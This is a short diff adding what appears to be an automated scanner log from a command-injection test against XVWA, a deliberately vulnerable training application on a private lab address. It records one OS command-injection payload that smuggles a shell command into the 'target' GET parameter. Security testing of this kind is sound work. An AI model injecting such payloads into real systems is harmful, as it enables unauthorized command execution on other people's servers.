@@ -1,0 +1,9 @@
+
+=====================================
+| Started in 2026-07-17 at 23:39:42 |
+=====================================
+[info] Tested URL : http://172.18.0.3:80/xvwa/vulnerabilities/cmdi/?target=127.0.0.1
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (GET) target
+[info] Used payload: 127.0.0.1;echo IZHTDH$((49%2B81))$(echo IZHTDH)IZHTDH
